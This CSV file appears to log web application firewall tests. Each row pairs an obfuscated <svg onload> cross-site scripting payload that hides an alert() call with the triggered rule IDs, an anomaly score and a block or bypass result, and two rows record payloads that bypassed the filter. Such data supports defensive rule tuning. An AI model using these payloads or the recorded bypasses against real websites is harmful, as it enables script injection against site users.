119,"<svg onload=""Function('return '+atob('YWxlcnQ=')+'(1)')()"">",0,1,block,5,"941100,941160,941390,942100,949110","v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,5v221,59t:htmlEntityDecode,t:jsDecode || v221,59 || ",20,176482721465.823564
120,"<svg onload=""Function('return al'+'ert(1)')()"">",0,1,block,5,"941100,941160,942100,942100,949110","v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v220,47 || v220,47t:urlDecodeUni || ",20,176482721770.963729
121,"<svg onload=""Function('return al'+String.fromCharCode(101,114,116)+'(1)')()"">",0,1,block,7,"934100,934100,934100,941100,941160,942100,949110","o34,19v221,77 || o34,19v221,77t:urlDecodeUni || o31,19v221,77t:removeWhitespace || v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v221,77 || ",30,176482721973.356002
122,"<svg onload=""Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941160,941390,949110","v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v220,47t:htmlEntityDecode,t:jsDecode || ",15,176482722263.790940
123,"<svg onload=""new Function(''+atob('YWxlcnQoMSk='))()"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v220,54 || o13,13v220,54t:urlDecodeUni || v220,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,54t:htmlEntityDecode,t:jsDecode || ",25,176482722560.536362
124,"<svg onload=""new Function('\u0061\u006c\u0065\u0072\u0074(1)')()"">",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,66 || o13,13v221,66 || o13,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482722832.729192
125,"<svg onload=""new Function('al'+String.fromCharCode(101,114,116)+'(1)')()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o13,13v221,74 || o13,13v221,74t:urlDecodeUni || o28,19v221,74t:removeWhitespace || v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,74t:htmlEntityDecode,t:jsDecode || ",30,176482723018.734505
126,"<svg onload=""new Function('ale'+'rt(9)')()"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v220,44 || o13,13v220,44t:urlDecodeUni || v220,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,44t:htmlEntityDecode,t:jsDecode || ",25,176482723329.923838
127,"<svg onload=""new Function('return '+String.fromCharCode(97,108,101,114,116)+'(1)')()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o13,13v221,86 || o13,13v221,86t:urlDecodeUni || o32,19v221,86t:removeWhitespace || v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,86t:htmlEntityDecode,t:jsDecode || ",30,176482723619.569982
128,"<svg onload=""new Function('return ale' + 'rt')()(1)""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,59 || o13,13v221,59t:urlDecodeUni || v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,59t:htmlEntityDecode,t:jsDecode || ",25,176482723960.875805
129,"<svg onload=""new Function(atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,57 || v220,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,57t:htmlEntityDecode,t:jsDecode || ",20,176482724187.005132
130,"<svg onload=""new Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,59 || v220,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,59t:htmlEntityDecode,t:jsDecode || ",20,176482724453.195281
131,"<svg onload=""new Function(unescape('%61%6C%65%72%74%28%31%29'))()""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,73 || o13,13v221,73t:urlDecodeUni || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,73t:htmlEntityDecode,t:jsDecode || ",25,176482724742.218418
132,"<svg onload=""setTimeout(Function('al'+'ert(1)'),0)"">",0,1,block,4,"941100,941160,941390,949110","v220,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v220,52t:htmlEntityDecode,t:jsDecode || ",15,176482725091.114967
133,"<svg onload=""setTimeout(Function('return al'+'ert(1)'),0)"">",0,1,block,4,"941100,941160,941390,949110","v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v221,59t:htmlEntityDecode,t:jsDecode || ",15,176482725281.511364
134,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');eval(a)},0)""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o62,7v221,81 || o24,11v221,81 || o23,11v221,81t:removeWhitespace || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,11v221,81t:htmlEntityDecode,t:jsDecode || ",30,176482725542.012390
135,"<svg onload=""setTimeout(function(){window['\u0061lert'](9)},0)"">",0,1,block,9,"920540,934100,934100,934100,941100,941160,941370,941390,949110","v158,10o43,6v221,64 || o24,11v221,64 || o24,11v221,64t:jsDecode || o23,11v221,64t:removeWhitespace || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,20v221,64t:urlDecodeUni,t:compressWhitespace || o13,11v221,64t:htmlEntityDecode,t:jsDecode || ",40,176482725876.350261
136,"<svg onload=""setTimeout(function(){window['al'+'ert'](1)},0)"">",0,1,block,8,"934100,934100,934100,941100,941160,941370,941390,949110","o24,11v221,62 || o24,11v221,62t:urlDecodeUni || o23,11v221,62t:removeWhitespace || v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v221,62t:urlDecodeUni,t:compressWhitespace || o13,11v221,62t:htmlEntityDecode,t:jsDecode || ",35,176482726119.170323
137,"<svg onload=""this.remove();(function(a){return eval(a)}('al'+'ert(1)'))()""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o47,7v221,81 || o47,5v221,81 || o47,5v221,81t:urlDecodeUni || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,5v221,81t:htmlEntityDecode,t:jsDecode || ",30,176482726331.752277
138,"<svg onload=""this.remove();(new Function('return al'+'ert'))()(1)"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o28,13v221,67 || o28,13v221,67t:urlDecodeUni || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,67t:htmlEntityDecode,t:jsDecode || ",25,17648272667.208170
139,"<svg onload=""this.remove();(new Function(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"934100,941100,941160,941390,949110","o28,13v221,67 || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,67t:htmlEntityDecode,t:jsDecode || ",20,176482726943.118940
140,"<svg onload=""this.remove();(new Function(unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o28,13v221,89 || o28,13v221,89t:urlDecodeUni || v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,89t:htmlEntityDecode,t:jsDecode || ",25,176482727218.845572
141,"<svg onload=""this.remove();Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941160,941390,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,5v221,61t:htmlEntityDecode,t:jsDecode || ",15,176482727431.707337
142,"<svg onload=""this.remove();new Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o39,55v221,107 || o27,13v221,107 || o39,5v221,107t:removeWhitespace || v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,13v221,107t:htmlEntityDecode,t:jsDecode || ",30,176482727749.859349
143,"<svg onload='(Function(""al""+""er""+""t(1)""))()'></svg>",0,1,bypass,2,"941100,941160","v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482728057.030593
144,"<svg onload='(function(){eval(atob(""YWxlcnQoMSk=""))})()'></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o25,25v221,63 || o14,11v221,63 || o13,11v221,63t:removeWhitespace || v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,5v221,63t:htmlEntityDecode,t:jsDecode || ",30,176482728348.726316
145,"<svg onload='(function(){var a=""a""+""l""+""e""+""r""+""t"";window[a](1)})()'>",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,69 || o14,11v221,69t:urlDecodeUni || o13,11v221,69t:removeWhitespace || v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,9v221,69t:urlDecodeUni,t:compressWhitespace || ",30,176482728558.875617
146,<svg onload='(function(){var a=String.fromCharCode(97);var l=String.fromCharCode(108);var e=String.fromCharCode(101);var r=String.fromCharCode(114);var t=String.fromCharCode(116);eval(a+l+e+r+t+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))})()'>,0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o179,38v221,272 || o14,11v221,272 || o14,11v221,272t:urlDecodeUni || o13,11v221,272t:removeWhitespace || v221,272t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,272t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o179,5v221,272t:htmlEntityDecode,t:jsDecode || ",35,176482728856.515627
147,<svg onload='(function(){var a=String.fromCharCode;window[a(97)+a(108)+a(101)+a(114)+a(116)](1)})()'/>,0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,102 || o14,11v221,102t:urlDecodeUni || o13,11v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,41v221,102t:urlDecodeUni,t:compressWhitespace || ",30,176482729143.382474
148,"<svg onload='(new Function(""\u0061\u006c\u0065\u0072\u0074(1)""))()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o28,6v221,68 || o14,13v221,68 || o14,13v221,68t:jsDecode || v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,68t:htmlEntityDecode,t:jsDecode || ",30,176482729417.194178
149,"<svg onload='(new Function(""al""+""ert(1)""))()'>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o14,13v220,46 || o14,13v220,46t:urlDecodeUni || v220,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v220,46t:htmlEntityDecode,t:jsDecode || ",25,176482729677.611220
150,"<svg onload='(new Function(""ret""+""urn \u0061lert""))()(1)'>",0,1,block,8,"920540,934100,934100,934100,941100,941160,941390,949110","v158,10o38,6v221,58 || o14,13v221,58 || o14,13v221,58t:urlDecodeUni || o14,13v221,58t:jsDecode || v221,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,58t:htmlEntityDecode,t:jsDecode || ",35,176482729913.139620
151,"<svg onload='(new Function(""return \\u0061ler\\u0074""))()(/XSS/)'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o36,6v221,66 || o14,13v221,66 || o14,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482730226.650416
152,"<svg onload='(new Function(""return \u0061\u006c\u0065\u0072\u0074""))()(1)'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o35,6v221,75 || o14,13v221,75 || o14,13v221,75t:jsDecode || v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,13v221,75t:htmlEntityDecode,t:jsDecode || ",30,176482730514.626185
153,"<svg onload='Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,4,"941100,941160,941390,949110","v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v221,61t:htmlEntityDecode,t:jsDecode || ",15,176482730870.340099
154,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(1)"")()' />",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,68 || o13,13v221,68 || o13,13v221,68t:jsDecode || v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,68t:htmlEntityDecode,t:jsDecode || ",30,176482731062.428991
155,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(1)"")()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,66 || o13,13v221,66 || o13,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482731389.955247
156,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(17)"")()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,67 || o13,13v221,67 || o13,13v221,67t:jsDecode || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,67t:htmlEntityDecode,t:jsDecode || ",30,176482731684.274247
157,"<svg onload='new Function(""\u0061\u006c\u0065\u0072\u0074(3)"")()'>",0,1,block,7,"920540,934100,934100,941100,941160,941390,949110","v158,10o27,6v221,66 || o13,13v221,66 || o13,13v221,66t:jsDecode || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,66t:htmlEntityDecode,t:jsDecode || ",30,176482731913.237698
158,"<svg onload='new Function(""a""+""l""+""ert(1)"")()'>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v220,47 || o13,13v220,47t:urlDecodeUni || v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,47t:htmlEntityDecode,t:jsDecode || ",25,176482732133.176961
159,"<svg onload='new Function(""var a=atob(\""YWxlcnQoMSk=\"");eval(a);"")()'></svg>",0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o56,7v221,76 || o13,13v221,76 || o13,13v221,76t:jsDecode || o51,5v221,76t:removeWhitespace || v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,76t:htmlEntityDecode,t:jsDecode || ",35,176482732424.187711
160,"<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,85 || o24,19v221,85t:removeWhitespace || v221,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,85t:htmlEntityDecode,t:jsDecode || ",25,176482732784.608437
161,"<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,13v221,88 || o24,19v221,88t:removeWhitespace || v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,88t:htmlEntityDecode,t:jsDecode || ",25,176482733064.192474
162,"<svg onload='new Function([].concat([""al""],[""ert""]).join("""")+""(1)"")()'></svg>",0,1,block,7,"934100,934100,941100,941160,941390,942151,949110","o13,13v221,77 || o13,13v221,77t:urlDecodeUni || v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,77t:htmlEntityDecode,t:jsDecode || o29,7v221,77t:urlDecodeUni || ",30,17648273326.118228
163,"<svg onload='new Function(atob(""YWxlcnQoMSk=""))()'>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,51 || v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,51t:htmlEntityDecode,t:jsDecode || ",20,176482733514.086599
164,"<svg onload='new Function(atob(""YWxlcnQoMjQp""))()'>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v220,51 || v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v220,51t:htmlEntityDecode,t:jsDecode || ",20,176482733849.682519
165,"<svg onload='new Function(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,5,"934100,941100,941160,941390,949110","o13,13v221,65 || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,13v221,65t:htmlEntityDecode,t:jsDecode || ",20,176482734159.421143
166,"<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"934100,934100,941100,941160,941370,949110","o28,11v221,103 || o27,11v221,103t:removeWhitespace || v221,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v221,103t:urlDecodeUni,t:compressWhitespace || ",25,17648273445.130899
167,"<svg onload='this.remove();(new Function(""al""+""ert(1)""))()'>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o28,13v221,60 || o28,13v221,60t:urlDecodeUni || v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,13v221,60t:htmlEntityDecode,t:jsDecode || ",25,176482734698.158838
168,<svg onload=(Function('\u0061\u006c\u0065\u0072\u0074(1)'))()>,0,1,block,5,"920540,941100,941160,941390,949110","v158,10o23,6v221,62 || v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,6v221,62t:htmlEntityDecode,t:jsDecode || ",20,176482734924.176581
169,<svg onload=(Function('al'+'ert(1)'))()>,0,1,bypass,2,"941100,941160","v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482735247.176603
170,<svg onload=(Function('al\x65rt(1)'))()>,0,1,block,4,"941100,941160,941390,949110","v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,6v220,40t:htmlEntityDecode,t:jsDecode || ",15,176482735584.538316
171,"<svg onload=(function(){Function('','\x61\x6c\x65\x72\x74(1)')();})()>",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o13,11v221,70 || o13,11v221,70t:jsDecode || o12,11v221,70t:removeWhitespace || v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,6v221,70t:htmlEntityDecode,t:jsDecode || ",30,176482735821.346820
172,<svg onload=(function(){Function('a'+'ler'+'t(1)')()})()>,0,1,block,6,"934100,934100,934100,941100,941160,949110","o13,11v221,57 || o13,11v221,57t:urlDecodeUni || o12,11v221,57t:removeWhitespace || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482736191.509270
173,<svg onload=(function(){Function(atob('YWxlcnQoMSk='))()})()>,0,1,block,6,"934100,934100,941100,941160,941390,949110","o13,11v221,61 || o12,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,5v221,61t:htmlEntityDecode,t:jsDecode || ",25,176482736377.706160
174,<svg onload=(function(){eval(atob('YWxlcnQoMSk='))})()>,0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o24,25v220,55 || o13,11v220,55 || o12,11v220,55t:removeWhitespace || v220,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,5v220,55t:htmlEntityDecode,t:jsDecode || ",30,176482736645.909406
